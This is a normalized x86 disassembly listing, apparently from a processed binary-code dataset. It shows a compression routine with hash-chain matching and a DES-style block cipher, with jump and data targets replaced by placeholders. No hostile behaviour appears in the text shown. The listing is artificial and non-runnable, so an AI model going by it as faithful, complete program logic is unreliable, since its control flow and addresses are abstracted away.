add [ esi + 0x408 ] ecx
mov eax [ esi + 0x404 ]
mov ecx eax
sub ecx [ esi + 0x40c ]
cmp ecx 0x16800
jbe r-xdata
cmp edi ebx
je r-xdata
mov [ esp + 0x2c ] edx
lea eax [ edi + 0x16800 ]
cmp eax [ esi + 0x404 ]
jbe r-xdata
lea ebx [ ebx ]
xor edi edi
mov eax [ esi + 0x40c ]
cmp edi eax
jbe r-xdata
mov ecx [ esp + 0x10 ]
mov dl [ ecx + eax ]
cmp dl [ ebp + ecx ]
mov ecx [ esp + 0x14 ]
mov ebx 0x2
je r-xdata
cmp edi ebx
je r-xdata
sub edi eax
add edi 0x16800
jmp r-xdata
sub edi eax
jmp r-xdata
mov edx [ esp + 0x30 ]
cmp ebx edx
jae r-xdata
cmp ecx [ esi + 0x424 ]
jne r-xdata
mov eax [ esi ]
mov edi [ eax + edi * 4 ]
lea eax [ edi + ecx ]
cmp eax ebp
jae r-xdata
je r-xdata
lea ecx [ ebp + 0x2 ]
mov ebp eax
sub ebp [ esp + 0x28 ]
lea eax [ edi + 0x16800 ]
cmp eax [ esi + 0x404 ]
jbe r-xdata
mov [ esp + 0x18 ] ecx
mov [ esp + 0x10 ] ebx
cmp ebx [ esp + 0x10 ]
jbe r-xdata
mov ecx [ esp + 0x14 ]
mov ebp [ esp + 0x28 ]
cmp ebx edx
inc ebx
inc ecx
cmp ebx edx
jb r-xdata
xor edi edi
mov eax [ esi + 0x40c ]
cmp edi eax
jbe r-xdata
cmp ecx [ esi + 0x424 ]
jne r-xdata
push ebx
push ecx
mov ecx esi
call sub_4109ba
mov ecx [ esp + 0x10 ]
mov edx [ esp + 0x18 ]
push ecx
push edx
mov ecx esi
mov ebp eax
call sub_4109ba
sub ebp eax
mov ecx [ esp + 0x14 ]
add ebp ebp
mov eax 0x4ec4ec4f
imul ebp
mov ebp [ esp + 0x28 ]
sar edx 0x2
mov eax edx
shr eax 0x1f
add eax edx
add eax [ esp + 0x10 ]
cmp ebx eax
jbe r-xdata
mov al [ ebp + ecx ]
cmp al [ ecx ]
jne r-xdata
test edi edi
jne r-xdata
sub edi eax
add edi 0x16800
jmp r-xdata
sub edi eax
jmp r-xdata
push ebx
push ecx
mov ecx esi
call sub_4109ba
mov edx [ esp + 0x10 ]
mov ebp eax
mov eax [ esp + 0x18 ]
push edx
push eax
mov ecx esi
call sub_4109ba
mov ecx eax
sub ecx ebp
mov ebp [ esp + 0x28 ]
mov eax 0x2aaaaaab
imul ecx
mov ecx edx
shr ecx 0x1f
add ecx edx
add ecx ebx
cmp ecx [ esp + 0x10 ]
jb r-xdata
mov [ esp + 0x18 ] ecx
jmp r-xdata
mov ecx ebp
sub ecx eax
mov [ esp + 0x14 ] ecx
cmp ecx [ esp + 0x2c ]
ja r-xdata
jmp r-xdata
mov ecx [ esi ]
mov edi [ ecx + edi * 4 ]
mov eax [ esi + 0x420 ]
add eax edi
sub [ esp + 0x1c ] 0x1
je r-xdata
mov edx [ esp + 0x14 ]
mov [ esp + 0x18 ] edx
mov [ esp + 0x10 ] ebx
sub_410ffd
sub esp 0x38
cmp [ esp + 0x44 ] 0x0
push esi
mov esi ecx
jne r-xdata
mov eax [ esp + 0x40 ]
test eax eax
jne r-xdata
xor eax eax
pop esi
add esp 0x38
retn 0x18
mov ecx [ esp + 0x44 ]
test ecx ecx
je r-xdata
or eax 0xffffffff
pop esi
add esp 0x38
retn 0x18
mov edx [ esp + 0x4c ]
test edx edx
je r-xdata
mov [ esi + 0x414 ] eax
dec eax
mov [ esi + 0x420 ] eax
mov [ esi + 0x410 ] ecx
mov eax 0xabeefbee
xor ecx ecx
push edi
movzx edi [ ecx + r--data ]
rol eax 0x1
xor eax edi
movzx edi [ ecx + r--data ]
rol eax 0x1
xor eax edi
movzx edi [ ecx + r--data ]
rol eax 0x1
xor eax edi
movzx edi [ ecx + r--data ]
rol eax 0x1
add ecx 0x4
xor eax edi
cmp ecx 0x100
jb r-xdata
test eax eax
jne r-xdata
pop edi
pop esi
add esp 0x38
retn 0x18
push ebx
mov [ esi ] edx
lea ecx [ esi + 0x4 ]
add edx 0x5a018
mov edi 0x100
lea ebx [ eax + 0x1 ]
push ebp
mov ebp [ ecx ]
mov [ ebp + eax ] 0x0
add eax 0x4
cmp eax 0x400
jb r-xdata
add edx 0x400
add ecx 0x4
sub edi ebx
jne r-xdata
mov [ ecx ] edx
xor eax eax
add eax 0x0
mov ecx [ esi + 0x414 ]
mov edx [ esi ]
or eax 0xffffffff
mov [ esi + 0x424 ] eax
mov [ esi + 0x408 ] ecx
mov [ esi + 0x404 ] ebx
mov [ esi + 0x40c ] edi
mov [ edx ] edi
mov ecx [ esi + 0x414 ]
mov edx [ esi + 0x410 ]
mov [ esi + 0x428 ] edi
mov cl [ ecx ]
mov [ esp + 0x1c ] eax
mov eax [ esp + 0x54 ]
mov [ edx ] cl
add [ esi + 0x414 ] ebx
add [ esi + 0x410 ] ebx
dec eax
mov [ esp + 0x10 ] edi
mov [ esp + 0x18 ] edi
mov [ esi + 0x41c ] ebx
mov [ esp + 0x58 ] ebx
cmp eax ebx
jbe r-xdata
mov edi [ esp + 0x54 ]
mov ebp 0x1
cmp ebx edi
jae r-xdata
lea ebx [ ebx ]
or ebx 0xffffffff
add [ esi + 0x41c ] ebx
lea ecx [ ebx + 0x9 ]
jne r-xdata
lea ebx [ ebx ]
cmp ebx [ esp + 0x1c ]
jne r-xdata
mov ecx [ esp + 0x18 ]
inc ecx
mov [ esp + 0x18 ] ecx
test cl cl
jne r-xdata
mov eax [ esi + 0x418 ]
mov dl [ eax ]
add dl dl
inc dl
mov [ eax ] dl
add [ esi + 0x41c ] ebx
jne r-xdata
mov eax [ esi + 0x410 ]
mov [ esi + 0x418 ] eax
inc eax
mov [ esi + 0x41c ] ecx
mov [ esi + 0x410 ] eax
mov eax [ esi + 0x414 ]
push ebx
push eax
mov ecx esi
call sub_410732
add [ esi + 0x414 ] ebp
add ebx ebp
cmp ebx edi
jb r-xdata
mov eax [ esp + 0x54 ]
mov ecx [ esi + 0x414 ]
sub eax ebx
push eax
push ebx
push ecx
lea edx [ esp + 0x34 ]
push edx
mov ecx esi
call sub_410d36
mov ebp [ esp + 0x2c ]
mov ebp [ esp + 0x44 ]
mov edx [ esp + 0x40 ]
mov [ esp + 0x2c ] ebp
mov [ esp + 0x28 ] edx
jmp r-xdata
mov edx [ esp + 0x60 ]
mov ecx [ esi + 0x410 ]
sub ecx [ esp + 0x50 ]
push edx
mov edx [ esi + 0x414 ]
sub edx [ esp + 0x50 ]
push ecx
mov ecx [ esp + 0x5c ]
push edx
push ecx
call eax
add esp 0x10
test eax eax
je r-xdata
mov eax [ esi + 0x418 ]
mov dl [ eax ]
add dl dl
inc dl
mov [ eax ] dl
add [ esi + 0x41c ] ebx
jne r-xdata
mov eax [ esi + 0x410 ]
mov [ esi + 0x418 ] eax
inc eax
mov [ esi + 0x41c ] ecx
mov [ esi + 0x410 ] eax
test edi edi
je r-xdata
mov eax [ esi + 0x424 ]
mov [ esp + 0x14 ] 0x0
cmp [ esp + 0x28 ] eax
jne r-xdata
cmp ebp 0x2
jl r-xdata
pop ebp
pop ebx
pop edi
or eax 0xffffffff
pop esi
add esp 0x38
retn 0x18
mov eax [ esi + 0x418 ]
shl [ eax ] 0x1
mov eax [ esi + 0x410 ]
mov [ eax ] 0x0
mov ecx [ esi + 0x41c ]
mov eax [ esi + 0x418 ]
add [ esi + 0x410 ] ebp
sub ecx ebp
shl [ eax ] cl
mov eax [ esp + 0x5c ]
test eax eax
je r-xdata
mov eax [ esi + 0x410 ]
mov [ esi + 0x418 ] eax
inc eax
mov [ esi + 0x41c ] ecx
mov [ esi + 0x410 ] eax
mov eax [ esi + 0x414 ]
push ebx
push eax
mov ecx esi
call sub_410732
inc edi
jmp r-xdata
mov eax [ esp + 0x54 ]
mov edx [ esi + 0x414 ]
sub eax ebx
mov [ esp + 0x20 ] eax
dec eax
push eax
lea ecx [ ebx + 0x1 ]
push ecx
inc edx
push edx
lea eax [ esp + 0x4c ]
push eax
mov ecx esi
call sub_410d36
mov ecx [ esp + 0x28 ]
cmp [ esp + 0x40 ] ecx
lea eax [ ebx + 0x1 ]
mov [ esp + 0x1c ] eax
push ebp
jl r-xdata
cmp edi 0x1
jbe r-xdata
mov eax [ esi + 0x410 ]
sub eax [ esp + 0x50 ]
pop ebp
pop ebx
mov ecx [ esp + 0x60 ]
mov edx [ esi + 0x410 ]
sub edx [ esp + 0x50 ]
push ecx
mov ecx [ esi + 0x414 ]
sub ecx [ esp + 0x50 ]
push edx
push ecx
push edi
call eax
add esp 0x10
test eax eax
jne r-xdata
mov eax [ esp + 0x54 ]
inc ebx
dec eax
mov [ esp + 0x58 ] ebx
cmp ebx eax
jb r-xdata
cmp edi [ esp + 0x3c ]
jne r-xdata
inc [ esi + 0x414 ]
mov ecx [ esp + 0x2c ]
push ecx
mov ecx esi
call sub_4109ba
mov edx [ esp + 0x44 ]
mov ebx eax
mov eax [ esp + 0x40 ]
push edx
push eax
mov ecx esi
call sub_4109ba
sub ebx eax
mov eax ebx
mov ebx [ esp + 0x58 ]
cdq
and edx 0x3
add eax edx
sar eax 0x2
mov edx ecx
push edx
mov ecx esi
call sub_4109ba
mov ecx [ esp + 0x40 ]
mov [ esp + 0x24 ] eax
mov eax [ esp + 0x44 ]
push eax
push ecx
mov ecx esi
call sub_4109ba
mov ecx [ esp + 0x24 ]
sub ecx eax
add ecx ecx
mov eax 0x38e38e39
imul ecx
sar edx 0x1
mov eax edx
shr eax 0x1f
add eax edx
jmp r-xdata
test edi edi
je r-xdata
cmp [ esp + 0x38 ] eax
je r-xdata
pop ebp
mov eax ebx
pop ebx
pop edi
pop esi
add esp 0x38
retn 0x18
mov eax [ esp + 0x5c ]
test eax eax
je r-xdata
test edi edi
je r-xdata
mov edx [ esp + 0x54 ]
mov ecx edi
sub ecx ebx
lea eax [ edx + ecx ]
cmp eax edi
jbe r-xdata
test edi edi
jbe r-xdata
mov [ esp + 0x14 ] 0x1
add eax [ esp + 0x44 ]
cmp ebp eax
jge r-xdata
cmp ebp 0x3
jg r-xdata
cmp edi 0x1
jbe r-xdata
mov eax [ esp + 0x10 ]
push edi
sub ebx edi
push ebx
push eax
mov ecx esi
call sub_4106d9
mov ecx [ esp + 0x38 ]
push edi
push ecx
mov ecx esi
mov ebx eax
call sub_4109ba
cmp eax ebx
jge r-xdata
cmp edi 0x1
jbe r-xdata
push eax
mov eax [ esp + 0x14 ]
mov ebp ebx
sub ebp edi
push ebp
push eax
lea ecx [ esp + 0x3c ]
push ecx
mov ecx esi
mov [ esp + 0x24 ] ebp
call sub_410d36
cmp [ esp + 0x34 ] edi
jb r-xdata
mov eax edi
jne r-xdata
cmp [ esp + 0x44 ] ebp
jl r-xdata
mov eax [ esp + 0x28 ]
push ebp
push eax
mov ecx esi
call sub_410a3c
add [ esi + 0x414 ] ebp
lea ebx [ ebp + ebx - 0x1 ]
jmp r-xdata
mov eax [ esi + 0x414 ]
push ebp
push ebx
push eax
mov ecx esi
call sub_4106d9
mov ecx [ esp + 0x28 ]
push ebp
push ecx
mov ecx esi
mov ebx eax
call sub_4109ba
cmp eax ebx
jg r-xdata
mov edx [ esp + 0x10 ]
lea ecx [ ebx - 0x1 ]
push ecx
push edx
mov ecx esi
call sub_410732
mov edx [ esp + 0x54 ]
mov ecx edi
sub ecx ebx
lea eax [ edx + ecx ]
cmp eax edi
jbe r-xdata
mov ebx [ esp + 0x58 ]
mov eax [ esp + 0x38 ]
cmp eax 0x500
jl r-xdata
mov edx [ esp + 0x10 ]
lea ecx [ ebx - 0x1 ]
push ecx
push edx
mov ecx esi
call sub_410732
mov ecx [ esp + 0x10 ]
push edi
mov eax ebx
sub eax edi
push eax
push ecx
mov ecx esi
call sub_4106d9
mov edx [ esp + 0x38 ]
push edi
push edx
mov ecx esi
mov ebp eax
call sub_4109ba
cmp eax ebp
jg r-xdata
mov eax [ esp + 0x10 ]
push edi
push ebp
push eax
mov ecx esi
call sub_4106d9
mov ecx [ esp + 0x38 ]
push edi
push ecx
mov ecx esi
mov ebp eax
call sub_4109ba
cmp eax ebp
jge r-xdata
mov edx [ esp + 0x30 ]
push edi
push edx
mov ecx esi
call sub_4109ba
mov ebp eax
mov eax [ esp + 0x38 ]
push edi
push eax
mov ecx esi
call sub_4109ba
cmp eax ebp
mov ebp [ esp + 0x14 ]
jle r-xdata
cmp [ esp + 0x14 ] 0x0
jne r-xdata
cmp [ esp + 0x44 ] ebp
jge r-xdata
test edi edi
mov ecx [ esp + 0x28 ]
push ebp
push ecx
mov ecx esi
call sub_4109ba
mov edx [ esp + 0x44 ]
mov ebx eax
mov eax [ esp + 0x40 ]
push edx
push eax
mov ecx esi
call sub_4109ba
cmp eax ebx
mov ebx [ esp + 0x58 ]
jge r-xdata
test edi edi
je r-xdata
mov ebx [ esp + 0x58 ]
mov [ esp + 0x14 ] ebp
test ebp ebp
je r-xdata
mov eax [ esp + 0x28 ]
cmp eax [ esi + 0x424 ]
jne r-xdata
push eax
mov eax [ esp + 0x14 ]
sub ebx edi
push ebx
push eax
lea ecx [ esp + 0x3c ]
push ecx
mov ecx esi
mov [ esp + 0x24 ] ebx
call sub_410d36
cmp [ esp + 0x34 ] edi
jb r-xdata
mov eax edi
cmp eax 0x7d00
jl r-xdata
cmp edi 0x2
je r-xdata
mov ebp [ esp + 0x10 ]
mov eax [ esp + 0x38 ]
cmp eax [ esi + 0x424 ]
jne r-xdata
mov ebp [ esp + 0x10 ]
add eax 0x0
mov eax [ esp + 0x38 ]
cmp eax [ esi + 0x424 ]
jne r-xdata
mov ecx [ esp + 0x30 ]
mov edx [ esp + 0x34 ]
mov [ esp + 0x38 ] ecx
mov [ esp + 0x3c ] edx
test edi edi
jne r-xdata
cmp ebp 0x2
jle r-xdata
mov ecx [ esi + 0x414 ]
push 0x1
push ebx
push ecx
mov ecx esi
call sub_4106d9
mov edx [ esp + 0x44 ]
mov ebx eax
mov eax [ esp + 0x40 ]
push edx
push eax
mov ecx esi
call sub_4109ba
mov ecx [ esp + 0x28 ]
push ebp
push ecx
mov ecx esi
lea ebx [ eax + ebx + 0x1 ]
call sub_4109ba
cmp ebx eax
mov ebx [ esp + 0x58 ]
jle r-xdata
mov [ esp + 0x14 ] 0x1
lea ebx [ ebp + ebx - 0x1 ]
jmp r-xdata
mov edx [ esi + 0x414 ]
push ebx
push edx
mov ecx esi
call sub_410732
mov eax 0x1
add [ esi + 0x414 ] eax
sub [ esp + 0x14 ] eax
jne r-xdata
cmp eax 0x500
jl r-xdata
cmp [ esi + 0x428 ] 0x0
je r-xdata
mov eax [ esp + 0x10 ]
push edi
push ebx
push eax
mov ecx esi
call sub_4106d9
mov ecx [ esp + 0x38 ]
push edi
push ecx
mov ecx esi
mov ebx eax
call sub_4109ba
cmp eax ebx
jge r-xdata
mov edx [ esp + 0x30 ]
push edi
push edx
mov ecx esi
call sub_4109ba
mov ebx eax
mov eax [ esp + 0x38 ]
push edi
push eax
mov ecx esi
call sub_4109ba
cmp eax ebx
mov ebx [ esp + 0x14 ]
jle r-xdata
mov ebx [ esp + 0x58 ]
cmp edi 0x3
je r-xdata
mov eax ebx
sub eax edi
push eax
push ebp
mov ecx esi
call sub_410732
inc ebp
sub edi 0x1
jne r-xdata
jmp r-xdata
cmp eax 0x500
jl r-xdata
cmp [ esi + 0x428 ] 0x0
je r-xdata
mov edx ebx
sub edx edi
push edx
push ebp
mov ecx esi
call sub_410732
inc ebp
sub edi 0x1
jne r-xdata
mov [ esp + 0x10 ] ebp
cmp eax 0x500
jl r-xdata
cmp [ esi + 0x428 ] 0x0
je r-xdata
inc edi
jmp r-xdata
mov ecx [ esp + 0x28 ]
mov edx [ esi + 0x414 ]
mov [ esp + 0x3c ] ebp
mov [ esp + 0x38 ] ecx
mov [ esp + 0x10 ] edx
mov edx [ esp + 0x20 ]
mov eax [ esi + 0x414 ]
add edx 0xfffffffe
push edx
add ebx 0x2
push ebx
add eax 0x2
push eax
lea ecx [ esp + 0x3c ]
push ecx
mov ecx esi
call sub_410d36
mov eax [ esp + 0x30 ]
cmp eax [ esp + 0x28 ]
mov edx [ esp + 0x34 ]
push edx
mov ecx esi
push eax
jl r-xdata
mov [ esp + 0x14 ] 0x0
jmp r-xdata
cmp eax 0x7d00
jl r-xdata
cmp ebp 0x2
je r-xdata
mov ebx [ esp + 0x58 ]
mov ebx [ esp + 0x58 ]
mov ebx [ esp + 0x28 ]
cmp ebx [ esi + 0x424 ]
jne r-xdata
mov ecx [ esp + 0x30 ]
mov edx [ esp + 0x34 ]
mov [ esp + 0x38 ] ecx
mov [ esp + 0x3c ] edx
cmp eax 0x7d00
jl r-xdata
cmp edi 0x2
je r-xdata
push edi
push eax
mov ecx esi
call sub_410a3c
jmp r-xdata
cmp eax 0x7d00
jl r-xdata
cmp edi 0x2
je r-xdata
push edi
push eax
mov ecx esi
call sub_410a3c
xor edi edi
jmp r-xdata
call sub_4109ba
mov ebx eax
mov eax [ esp + 0x28 ]
push ebp
push eax
mov ecx esi
call sub_4109ba
mov ecx eax
sub ecx ebx
add ecx ecx
mov eax 0x2e8ba2e9
imul ecx
sar edx 0x1
mov ecx edx
shr ecx 0x1f
add ecx edx
call sub_4109ba
mov ebx eax
mov eax [ esp + 0x28 ]
push ebp
push eax
mov ecx esi
call sub_4109ba
sub eax ebx
cdq
and edx 0x3
add eax edx
mov ecx eax
sar ecx 0x2
jmp r-xdata
mov eax [ esp + 0x10 ]
mov edx ebx
sub edx edi
push edx
push eax
mov ecx esi
call sub_410732
inc [ esp + 0x10 ]
sub edi 0x1
jne r-xdata
jmp r-xdata
mov ebx [ esp + 0x58 ]
mov edx [ esp + 0x14 ]
mov eax [ esp + 0x10 ]
push edi
push edx
push eax
mov ecx esi
call sub_4106d9
push ebp
push ebx
mov ecx esi
mov [ esp + 0x2c ] eax
call sub_4109ba
mov ecx [ esp + 0x24 ]
add ecx eax
mov edx ebx
push ebp
inc edx
mov [ esp + 0x28 ] ecx
push edx
mov ecx esi
call sub_4109ba
mov ebx eax
mov eax [ esp + 0x38 ]
push edi
push eax
mov ecx esi
call sub_4109ba
mov ebp [ esp + 0x2c ]
add ebx eax
mov eax [ esp + 0x24 ]
cmp eax ebx
mov ebx [ esp + 0x58 ]
jle r-xdata
cmp edi 0x3
je r-xdata
cmp edi 0x3
je r-xdata
test edi edi
jbe r-xdata
mov [ esp + 0x14 ] 0x1
mov eax [ esp + 0x34 ]
add ecx eax
cmp ebp ecx
jge r-xdata
cmp eax 0x500
jl r-xdata
cmp [ esi + 0x428 ] 0x0
je r-xdata
jmp r-xdata
cmp [ esp + 0x14 ] 0x0
jne r-xdata
cmp eax ebp
jl r-xdata
cmp [ esp + 0x38 ] 0x7d00
jl r-xdata
cmp edi 0x2
je r-xdata
mov ecx [ esp + 0x38 ]
push edi
push ecx
mov ecx esi
call sub_410a3c
jmp r-xdata
mov eax [ esp + 0x38 ]
cmp eax [ esi + 0x424 ]
jne r-xdata
mov ebx [ esp + 0x58 ]
cmp ebp 0x3
jle r-xdata
mov edx [ esp + 0x30 ]
push eax
push edx
mov ecx esi
call sub_4109ba
mov ebx eax
mov eax [ esp + 0x28 ]
push ebp
push eax
mov ecx esi
call sub_4109ba
cmp ebx eax
jl r-xdata
cmp edi 0x3
je r-xdata
xor edi edi
mov ecx [ esp + 0x20 ]
mov edx [ esp + 0x58 ]
mov eax [ esi + 0x414 ]
add ecx 0xfffffffd
push ecx
add edx 0x3
push edx
add eax 0x3
push eax
lea ecx [ esp + 0x3c ]
push ecx
mov ecx esi
call sub_410d36
mov eax [ esp + 0x30 ]
mov edx [ esp + 0x34 ]
mov ebx [ esp + 0x28 ]
cmp eax ebx
push edx
mov ecx esi
push eax
jl r-xdata
call sub_4109ba
push ebp
push ebx
mov ecx esi
mov [ esp + 0x2c ] eax
call sub_4109ba
mov ecx eax
mov eax [ esp + 0x24 ]
sub ecx eax
add ecx ecx
mov eax 0x2e8ba2e9
imul ecx
sar edx 0x1
mov ecx edx
shr ecx 0x1f
add ecx edx
call sub_4109ba
push ebp
push ebx
mov ecx esi
mov [ esp + 0x2c ] eax
call sub_4109ba
mov ecx [ esp + 0x24 ]
sub eax ecx
cdq
and edx 0x3
add eax edx
mov ecx eax
sar ecx 0x2
jmp r-xdata
test edi edi
jbe r-xdata
mov [ esp + 0x14 ] 0x1
mov eax [ esp + 0x34 ]
add ecx eax
cmp ebp ecx
jge r-xdata
cmp [ esp + 0x14 ] 0x0
jne r-xdata
cmp eax ebp
jl r-xdata
mov edx [ esp + 0x30 ]
push eax
push edx
mov ecx esi
call sub_4109ba
mov ebx eax
mov eax [ esp + 0x28 ]
push ebp
push eax
mov ecx esi
call sub_4109ba
cmp ebx eax
jl r-xdata
sub_411a66
mov eax [ esp + 0xc ]
sub esp 0x42c
test eax eax
jne r-xdata
mov ecx [ esp + 0x444 ]
mov edx [ esp + 0x440 ]
push ecx
mov ecx [ esp + 0x440 ]
push edx
mov edx [ esp + 0x43c ]
push ecx
push eax
mov eax [ esp + 0x440 ]
push edx
push eax
lea ecx [ esp + 0x18 ]
call sub_410ffd
add esp 0x42c
retn
add esp 0x42c
retn
sub_411ac0
push ebp
mov ebp esp
sub esp 0xf0
push ebx
push esi
push edi
mov edx [ ebp + 0x8 ]
xor ebx ebx
movzx esi [ ebx + rw-data ]
mov eax esi
sar eax 0x3
movzx eax [ eax + edx ]
mov ecx esi
and ecx 0x7
movzx ecx [ ecx + ecx + rw-data ]
test eax ecx
setne cl
movzx eax cl
mov [ ebp + ebx - 0x38 ] al
inc ebx
cmp ebx 0x38
jl r-xdata
xor edx edx
lea ecx [ edx + edx ]
mov eax edx
neg eax
lea ecx [ eax + eax + 0x1e ]
jmp r-xdata
mov al [ ebp + esi - 0x54 ]
mov [ ebp + ebx - 0x70 ] al
mov al [ ebp + esi - 0x38 ]
mov [ ebp + ebx - 0x70 ] al
jmp r-xdata
lea edi [ ecx + 0x1 ]
and [ ebp + edi * 4 - 0xf0 ] 0x0
and [ ebp + ecx * 4 - 0xf0 ] 0x0
xor ebx ebx
movzx eax [ edx + rw-data ]
lea esi [ eax + ebx ]
cmp esi 0x1c
jge r-xdata
mov ebx 0x1c
inc ebx
cmp ebx 0x1c
jl r-xdata
mov al [ ebp + esi - 0x54 ]
mov [ ebp + ebx - 0x70 ] al
mov al [ ebp + esi - 0x38 ]
mov [ ebp + ebx - 0x70 ] al
jmp r-xdata
movzx eax [ edx + rw-data ]
lea esi [ eax + ebx ]
cmp esi 0x38
jge r-xdata
xor ebx ebx
inc ebx
cmp ebx 0x38
jl r-xdata
movzx eax [ ebx + rw-data ]
cmp [ ebp + eax - 0x70 ] 0x0
je r-xdata
mov eax [ ebx * 4 + rw-data ]
or [ ebp + ecx * 4 - 0xf0 ] eax
inc ebx
cmp ebx 0x18
jl r-xdata
mov eax [ ebx * 4 + rw-data ]
or [ ebp + edi * 4 - 0xf0 ] eax
movzx eax [ ebx + rw-data ]
cmp [ ebp + eax - 0x70 ] 0x0
je r-xdata
inc edx
cmp edx 0x10
jl r-xdata
cmp [ ebp + 0xc ] 0x1
jne r-xdata
lea eax [ ebp - 0xf0 ]
push eax
call sub_411bdd
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_411bdd
push ebp
mov ebp esp
sub esp 0x80
push ebx
push esi
push edi
mov eax [ ebp + 0x8 ]
lea edx [ ebp - 0x80 ]
mov ecx 0x10
mov ebx eax
add eax 0x4
mov esi [ ebx ]
and esi 0xfc0000
shl esi 0x6
mov edi [ ebx ]
and edi 0xfc0
shl edi 0xa
or esi edi
mov edi [ eax ]
and edi 0xfc0000
shr edi 0xa
or esi edi
mov [ edx ] esi
mov esi edx
add edx 0x4
mov edi [ eax ]
and edi 0xfc0
shr edi 0x6
or edi [ esi ]
mov [ esi ] edi
mov esi [ ebx ]
and esi 0x3f000
shl esi 0xc
mov ebx [ ebx ]
and ebx 0x3f
shl ebx 0x10
or esi ebx
mov ebx [ eax ]
and ebx 0x3f000
shr ebx 0x4
or esi ebx
mov [ edx ] esi
mov ebx edx
add edx 0x4
mov esi [ eax ]
and esi 0x3f
or esi [ ebx ]
mov [ ebx ] esi
dec ecx
add eax 0x4
test ecx ecx
jne r-xdata
lea eax [ ebp - 0x80 ]
push eax
call sub_411c9e
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x4
sub_411cbc
push ebp
mov ebp esp
push eax
push eax
push ebx
mov eax [ ebp + 0x8 ]
mov ebx [ ebp + 0xc ]
lea edx [ ebp - 0x8 ]
push edx
push eax
call sub_411cf1
push rw-data
lea eax [ ebp - 0x8 ]
push eax
call sub_411da9
push ebx
lea eax [ ebp - 0x8 ]
push eax
call sub_411d5a
pop ebx
mov esp ebp
pop ebp
retn 0x8
sub_411cf1
push ebx
mov eax [ esp + 0x8 ]
mov edx [ esp + 0xc ]
mov ecx eax
inc eax
movzx ecx [ ecx ]
shl ecx 0x18
mov [ edx ] ecx
mov ecx eax
inc eax
movzx ecx [ ecx ]
shl ecx 0x10
or ecx [ edx ]
mov [ edx ] ecx
mov ecx eax
inc eax
movzx ecx [ ecx ]
shl ecx 0x8
or ecx [ edx ]
mov [ edx ] ecx
mov ecx edx
add edx 0x4
mov ebx eax
inc eax
movzx ebx [ ebx ]
or [ ecx ] ebx
mov ecx eax
inc eax
movzx ecx [ ecx ]
shl ecx 0x18
mov [ edx ] ecx
mov ecx eax
inc eax
movzx ecx [ ecx ]
shl ecx 0x10
or ecx [ edx ]
mov [ edx ] ecx
mov ecx eax
inc eax
movzx ecx [ ecx ]
shl ecx 0x8
or ecx [ edx ]
movzx eax [ eax ]
or ecx eax
mov [ edx ] ecx
pop ebx
retn 0x8
sub_411d5a
push ebx
mov edx [ esp + 0x8 ]
mov ecx [ esp + 0xc ]
mov eax [ edx ]
shr eax 0x18
mov [ ecx ] al
inc ecx
mov eax [ edx ]
shr eax 0x10
mov [ ecx ] al
inc ecx
mov eax [ edx ]
shr eax 0x8
mov [ ecx ] al
inc ecx
mov ebx ecx
inc ecx
mov eax edx
add edx 0x4
mov eax [ eax ]
mov [ ebx ] al
mov eax [ edx ]
shr eax 0x18
mov [ ecx ] al
inc ecx
mov eax [ edx ]
shr eax 0x10
mov [ ecx ] al
inc ecx
mov eax [ edx ]
shr eax 0x8
mov [ ecx ] al
inc ecx
mov edx [ edx ]
mov al dl
mov [ ecx ] al
pop ebx
retn 0x8
sub_411da9
push ebp
mov ebp esp
sub esp 0xc
push ebx
push esi
push edi
mov eax [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx ]
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx + 0x4 ]
mov ebx edx
shr ebx 0x4
xor ebx ecx
and ebx 0xf0f0f0f
xor ecx ebx
mov esi ebx
shl esi 0x4
xor edx esi
mov esi edx
shr esi 0x10
xor esi ecx
mov ebx esi
and ebx 0xffff
xor ecx ebx
mov esi ebx
shl esi 0x10
xor edx esi
mov esi ecx
shr esi 0x2
xor esi edx
mov ebx esi
and ebx 0x33333333
xor edx ebx
mov esi ebx
shl esi 0x2
xor ecx esi
mov esi ecx
shr esi 0x8
xor esi edx
mov ebx esi
and ebx 0xff00ff
xor edx ebx
mov esi ebx
shl esi 0x8
xor esi ecx
mov [ ebp - 0x4 ] esi
add esi esi
mov edi [ ebp - 0x4 ]
shr edi 0x1f
and edi 0x1
mov ecx esi
or ecx edi
mov esi edx
xor esi ecx
mov ebx esi
and ebx 0xaaaaaaaa
xor edx ebx
xor ecx ebx
lea esi [ edx + edx ]
mov edi edx
shr edi 0x1f
and edi 0x1
mov edx esi
or edx edi
mov [ ebp - 0x8 ] 0x8
mov esi ecx
shl esi 0x1c
mov edi ecx
shr edi 0x4
mov ebx esi
or ebx edi
mov esi eax
add eax 0x4
xor ebx [ esi ]
mov esi ebx
and esi 0x3f
mov esi [ esi * 4 + rw-data ]
mov edi ebx
shr edi 0x6
and edi 0xfc
or esi [ edi + rw-data ]
mov edi ebx
shr edi 0xe
and edi 0xfc
or esi [ edi + rw-data ]
mov edi ebx
shr edi 0x16
and edi 0xfc
or esi [ edi + rw-data ]
mov [ ebp - 0xc ] esi
mov esi eax
add eax 0x4
mov ebx ecx
xor ebx [ esi ]
mov esi ebx
and esi 0x3f
mov esi [ esi * 4 + rw-data ]
or esi [ ebp - 0xc ]
mov edi ebx
shr edi 0x6
and edi 0xfc
or esi [ edi + rw-data ]
mov edi ebx
shr edi 0xe
and edi 0xfc
or esi [ edi + rw-data ]
mov edi ebx
shr edi 0x16
and edi 0xfc
or esi [ edi + rw-data ]
xor edx esi
mov esi edx
shl esi 0x1c
mov edi edx
shr edi 0x4
mov ebx esi
or ebx edi
mov esi eax
add eax 0x4
xor ebx [ esi ]
mov esi ebx
and esi 0x3f
mov esi [ esi * 4 + rw-data ]
mov edi ebx
shr edi 0x6
and edi 0xfc
or esi [ edi + rw-data ]
mov edi ebx
shr edi 0xe
and edi 0xfc
or esi [ edi + rw-data ]
mov edi ebx
shr edi 0x16
and edi 0xfc
or esi [ edi + rw-data ]
mov [ ebp - 0xc ] esi
mov esi eax
add eax 0x4
mov ebx edx
xor ebx [ esi ]
mov esi ebx
and esi 0x3f
mov esi [ esi * 4 + rw-data ]
or esi [ ebp - 0xc ]
mov edi ebx
shr edi 0x6
and edi 0xfc
or esi [ edi + rw-data ]
mov edi ebx
shr edi 0xe
and edi 0xfc
or esi [ edi + rw-data ]
mov edi ebx
shr edi 0x16
and edi 0xfc
or esi [ edi + rw-data ]
xor ecx esi
dec [ ebp - 0x8 ]
cmp [ ebp - 0x8 ] 0x0
